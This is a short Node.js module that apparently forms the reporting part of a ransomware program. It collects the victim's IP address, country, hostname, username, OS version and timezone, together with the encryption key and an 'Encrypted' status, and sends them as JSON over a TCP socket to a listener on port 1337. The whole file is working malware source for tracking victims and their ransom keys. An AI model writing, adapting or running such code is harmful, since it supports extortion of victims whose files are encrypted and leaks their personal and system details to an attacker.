'use strict';
const net = require('net');
const os = require('os');
const request = require('request');
const parseString = require('xml2js').parseString;
const keyData = require('./keyData');
const client = new net.Socket();
const url = "https://freegeoip.live/xml/";
const date = new Date();

module.exports.send = function () {

	client.connect(1337, '127.0.0.1', function () {

		request(url, function (_error, _response, body) {

			parseString(body, function (_err, result) {

				var dataObject = {

					ID: uuid(),
					IP: String(result.Response.IP),
					Country: String(result.Response.CountryName),
					Flag: String(result.Response.CountryCode),
					PC: os.hostname(),
					User: os.userInfo().username,
					OS: os.version(),
					TimeZone: String(result.Response.TimeZone),
					DateTime: dateTime(),
					Price: "0$",
					Key: keyData.key,
					Status: "Encrypted"
				};

				client.write(JSON.stringify(dataObject));
				client.destroy();
			});
		});
	});
}

function uuid() {

	return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
		var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
		return v.toString(16);
	});
}

function dateTime() {

	return date.getFullYear() + "-"
		+ ("0" + (date.getMonth() + 1)).slice(-2) + "-"
		+ ("0" + date.getDate()).slice(-2) + " "
		+ date.getHours() + ":"
		+ date.getMinutes() + ":"
		+ date.getSeconds()
}